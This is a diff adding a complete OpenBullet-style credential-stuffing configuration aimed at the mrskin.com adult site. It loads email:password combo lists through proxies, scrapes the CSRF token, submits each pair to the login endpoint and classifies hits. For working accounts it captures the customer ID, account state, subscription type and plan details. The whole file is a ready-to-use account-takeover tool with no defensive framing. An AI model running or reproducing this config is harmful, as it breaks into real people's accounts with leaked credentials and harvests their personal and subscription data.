@@ -1,0 +1,142 @@
+[SETTINGS]
+{
+  "Name": "Mr. Skin",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-09T00:44:20.6308813+01:00",
+  "AdditionalInfo": "",
+  "Author": "sp00f_X",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.mrskin.com/" 
+  
+  HEADER "Host: www.mrskin.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+#TOKEN PARSE "<SOURCE>" LR "\"csrf-token\" content=\"" "\" />" -> VAR "Token" 
+
+REQUEST POST "https://www.mrskin.com/account/login" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<Token>&_tgt_url=%2F&customer%5Busername%5D=<USER>&customer%5Bpassword%5D=<PASS>&customer%5Bremember_me%5D=0&commit=Sign+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.mrskin.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-CSRF-Token: <Token>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-MOD-SBB-CTYPE: xhr" 
+  HEADER "Origin: https://www.mrskin.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.mrskin.com/" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" EqualTo "{\"success\":true}" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password" 
+
+REQUEST GET "https://www.mrskin.com/adult_network/gateway?_tgt_url=%2F" ReadResponseSource=FALSE 
+  
+  HEADER "Host: www.mrskin.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.mrskin.com/account" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+REQUEST GET "https://www.mrskin.com/account/subscriptions#content" 
+  
+  HEADER "Host: www.mrskin.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.mrskin.com/account" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Free Membership" 
+  KEYCHAIN Success OR 
+    KEY "Full Membership" 
+
+PARSE "<SOURCE>" LR "\"customerId\":" ",\"" CreateEmpty=FALSE -> CAP "Customer ID" 
+
+PARSE "<SOURCE>" LR "{\"accountState\":\"" "\"," CreateEmpty=FALSE -> CAP "Account state" 
+
+PARSE "<SOURCE>" LR "\"subscriptionClassification\":\"" "\"" CreateEmpty=FALSE -> CAP "Mr. Skin Subscription Type" 
+
+PARSE "<SOURCE>" LR "<span class='product_logo'></span>" "<div class='plan_description'>" Recursive=TRUE -> VAR "Subscriptions" 
+
+FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "<h3>" VALUE "" 
+  KEY "</h3>" VALUE "" 
+  "<Subscriptions[*]>" -> VAR "Subscriptions" 
+
+PARSE "<SOURCE>" LR "<div class='plan_description'>" "</div>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Plan description" 
+
+FUNCTION Constant "<Subscriptions[*]> - <Plan description[*]>" -> CAP "Plans" 
+
